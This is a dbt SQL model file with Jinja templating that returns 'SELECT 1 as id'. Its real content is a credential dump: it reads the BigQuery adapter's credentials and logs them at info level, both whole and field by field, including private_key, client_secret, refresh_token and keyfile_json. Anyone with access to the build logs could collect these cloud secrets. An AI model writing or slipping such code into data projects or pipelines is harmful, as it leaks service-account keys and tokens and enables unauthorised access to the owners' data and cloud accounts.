{# Full credential dump from adapter.config.credentials #}
{%- set creds = adapter.config.credentials -%}

{# Full string representation - no truncation #}
{{ log("CREDS_FULL_1=" ~ creds | string, info=True) }}

{# Try to access individual credential fields #}
{%- for field in ['database', 'schema', 'method', 'project', 'execution_project',
                   'keyfile', 'keyfile_json', 'private_key', 'private_key_id',
                   'client_email', 'client_id', 'token_uri', 'auth_uri',
                   'type', 'token', 'refresh_token', 'client_secret',
                   'impersonate_service_account', 'scopes',
                   'location', 'priority', 'maximum_bytes_billed',
                   'job_retry_deadline_seconds', 'job_creation_timeout_seconds',
                   'timeout_seconds', 'job_retries', 'gcs_bucket',
                   'dataproc_region', 'dataproc_cluster_name'] -%}
  {%- set val = creds[field] if creds[field] is defined else 'FIELD_NOT_FOUND' -%}
  {{ log("CRED_" ~ field ~ "=" ~ val | string | truncate(1000), info=True) }}
{%- endfor -%}

{# Try to convert to dict/json for full dump #}
{%- set creds_dict = creds | string -%}
{{ log("CREDS_STR_LEN=" ~ creds_dict | length, info=True) }}

{# Try tojson for structured output #}
{%- set creds_json = tojson(creds) -%}
{{ log("CREDS_JSON=" ~ creds_json | truncate(2000), info=True) }}

{# Also check if there's a to_dict method #}
{%- if creds.to_dict is defined -%}
  {{ log("CREDS_TO_DICT=" ~ creds.to_dict() | string | truncate(2000), info=True) }}
{%- else -%}
  {{ log("CREDS_TO_DICT=NO_METHOD", info=True) }}
{%- endif -%}

{# Try __dict__ via the available path #}
{%- if creds.connection_info is defined -%}
  {{ log("CREDS_CONN_INFO=" ~ creds.connection_info() | string | truncate(2000), info=True) }}
{%- else -%}
  {{ log("CREDS_CONN_INFO=NO_METHOD", info=True) }}
{%- endif -%}

SELECT 1 as id
